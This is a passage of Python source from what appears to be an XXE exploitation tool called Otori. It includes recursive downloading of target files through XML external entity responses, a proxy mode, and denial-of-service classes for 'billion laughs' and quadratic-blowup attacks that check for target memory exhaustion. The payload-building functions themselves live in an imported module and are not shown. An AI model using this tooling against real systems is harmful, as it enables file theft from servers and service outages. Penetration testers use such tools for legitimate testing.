			if (createdLocalDirectory):
				subContentExists = False

				for nr in nextResults:
					nr.LocalPath = OtoriInstance.getNextLocalPath(currentLocalPath, nr.OriginalRelativePath)
					nrCloned = libxxeexploits.XXEResponse.CloneWithoutResponseText(nr)
					newAllResultsList.append(nrCloned)
					self.MultiLogger.debug('Appending "' + nrCloned.XXETarget + '" with response code ' + str(nrCloned.ReturnCode))
					if (nr.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_OK):
						self.MultiLogger.debug('Recursing into "' + nr.XXETarget + '"')				
						recurseList = self.DownloadAndRecurse(nr.LocalPath, nr.XXETarget, newDepth, nr)					
						for rle in recurseList:
							if (rle.LocalSize > 0):
								subContentExists = True
							if (rle.ReturnCode != libxxeexploits.XXEResponse.RESPONSE_NOTFOUND):
								self.addResult(rle)
					else:
						if (nr.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_NOTFOUND):
							self.MultiLogger.debug('"' + nr.XXETarget + '" was not found')
						else:
							self.MultiLogger.debug('"' + nr.XXETarget + '" returned an error')
				if not (subContentExists):
					if (self.deleteEmptyDirectories):
						# double-check to make sure there wasn't already something here
						if os.listdir(currentLocalPath):
							self.MultiLogger.info('No content was downloaded into "' + currentLocalPath + '", but there were files already present, so this directory will not be deleted.')
						else:
							self.MultiLogger.info('Deleting empty local directory "' + currentLocalPath + '"')
							try:
								os.rmdir(currentLocalPath)
							except:
								self.MultiLogger.error('Error: unable to delete empty local directory "' + currentLocalPath + '"')
		else:
			self.MultiLogger.debug('The current list appears to be a file')
			fileResult = libxxeexploits.XXEResponse.CloneWithoutResponseText(previousResult)
			fileResult = self.CreateLocalFile(currentLocalPath, previousResult.ParsedResponse, fileResult)

			newAllResultsList.append(fileResult)
			
		return newAllResultsList
			
		
		
class OtoriInstanceTest(OtoriInstance):
	
	def __init__(self, multiLogger, xxemodule, targetURLs, requestMode, requestRootOrList, requestTimeout, maxRetries, requestWaitTime, requestWaitTimeWindow, userAgent, cookieString):
		OtoriInstance.__init__(self, multiLogger, xxemodule, targetURLs, OtoriInstance.OPMODE_TEST, requestMode, requestRootOrList, '', EXISTINGFILES_PRESERVE, requestTimeout, maxRetries, requestWaitTime, requestWaitTimeWindow)
		
		
#class OtoriInstancePortScan(OtoriInstance):
	
	#def __init__(self):

	
class OtoriInstanceXXEProxy(OtoriInstance):

	def __init__(self, multiLogger, xxemodule, targetURLs, existingFilesBehaviour, requestTimeout, maxRetries, requestWaitTime, requestWaitTimeWindow, userAgent, cookieString, storeAllResults, getForAllMethods, suppressCustomMessages):
		OtoriInstance.__init__(self, multiLogger, xxemodule,targetURLs, OtoriInstance.OPMODE_XXEPROXY, OtoriInstance.REQUESTMODE_SINGLEURI, '', outputBase, existingFilesBehaviour, requestTimeout, maxRetries, requestWaitTime, requestWaitTimeWindow)
		self.storeAllResults = storeAllResults
		self.getForAllMethods = getForAllMethods
		self.suppressCustomMessages = suppressCustomMessages

class OtoriInstanceDoSMemoryExhaustion(OtoriInstance):
	def __init__(self, multiLogger, xxemodule, outputBase, requestTimeout, maxRetries, requestWaitTime, requestWaitTimeWindow, opMode):
		OtoriInstance.__init__(self, multiLogger, xxemodule, opMode, None, None, outputBase, None, requestTimeout, maxRetries, requestWaitTime, requestWaitTimeWindow)

	def Operate(self):
		succeeded = False
		retryCount = 0
		#result = libxxeexploits.XXEResponse()
		result = libxxeexploits.XXEResponse.GetUnknownFailureResponse('Denial-of-service attack')
		while not (succeeded):
			try:
				result = self.OperateInner()
			except Exception as e:
				self.HandleRequestException(e)
			if (result.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_OUT_OF_MEMORY):
				shouldRetry = False
				break
			else:
				shouldRetry = self.HandleRequestResponse(result, retryCount)
				if not (shouldRetry):
					break
			retryCount = retryCount + 1
			self.WaitBetweenRequestsIfNecessary()
		result = self.CheckDoSResponse(result)
		return result
		
	def OperateInner(self):
		return 'NOT IMPLEMENTED'
		
	def CheckDoSResponse(self, response):
		foundResult = False
		succeeded = False
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_OUT_OF_MEMORY):
			foundResult = True
			succeeded = True
			self.MultiLogger.info('Received an out-of-memory response from the target - the denial-of-service attack was most likely successful')
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_TIMEOUT):
			foundResult = True
			self.MultiLogger.info('The response timed out - this may indicate that the denial-of-service attack was successful')
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_NETWORK_ERROR):
			foundResult = True
			self.MultiLogger.info('The response generated a network-level error - this may indicate that the denial-of-service attack was successful')
			
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_OK):
			foundResult = True
			self.MultiLogger.warning('The request generated an "OK" response - the denial-of-service attack was most likely NOT successful')
		if (response.ReturnCode == libxxeexploits.XXEResponse.RESPONSE_TOOLARGE):
			foundResult = True
			self.MultiLogger.warning('The request generated a response that was too large - this may indicate that the denial-of-service content was too small to fully occupy available memory on the target')

		ambiguousResponseText = 'Received an ambiguous response from the target - you should manually verify whether or not the denial-of-service attack was successful'
		if not (foundResult):
			self.MultiLogger.warning(ambiguousResponseText)
		else:
			if not (succeeded):
				self.MultiLogger.warning(ambiguousResponseText)

		return response

class OtoriInstanceDoSLulz(OtoriInstanceDoSMemoryExhaustion):
	def __init__(self, multiLogger, xxemodule, outputBase, requestTimeout, maxRetries, requestWaitTime, requestWaitTimeWindow, dosString, lulzBase, lulzExp):
		OtoriInstanceDoSMemoryExhaustion.__init__(self, multiLogger, xxemodule, outputBase, requestTimeout, maxRetries, requestWaitTime, requestWaitTimeWindow, OtoriInstance.OPMODE_DOSLULZ)
		self.DoSString = dosString
		self.LulzBase = lulzBase
		self.LulzExponent = lulzExp

	def OperateInner(self):
		return self.module.SendDoSLulz(self.LulzBase, self.LulzExponent, self.DoSString)
		
class OtoriInstanceDoSQuad(OtoriInstanceDoSMemoryExhaustion):
	def __init__(self, multiLogger, xxemodule, outputBase, requestTimeout, maxRetries, requestWaitTime, requestWaitTimeWindow, dosString, quadBase, quadMultiplier):
		OtoriInstanceDoSMemoryExhaustion.__init__(self, multiLogger, xxemodule, outputBase, requestTimeout, maxRetries, requestWaitTime, requestWaitTimeWindow, OtoriInstance.OPMODE_DOSQUAD)
		self.DoSString = dosString
		self.QuadBase = quadBase
		self.QuadMultiplier = quadMultiplier
		
	#def Operate(self):
		#result = self.module.SendDoSQuadraticBlowup(self.QuadBase, self.QuadMultiplier, self.DoSString)
		#result = self.CheckDoSResponse(result)
		#return result
	def OperateInner(self):
		return self.module.SendDoSQuadraticBlowup(self.QuadBase, self.QuadMultiplier, self.DoSString)
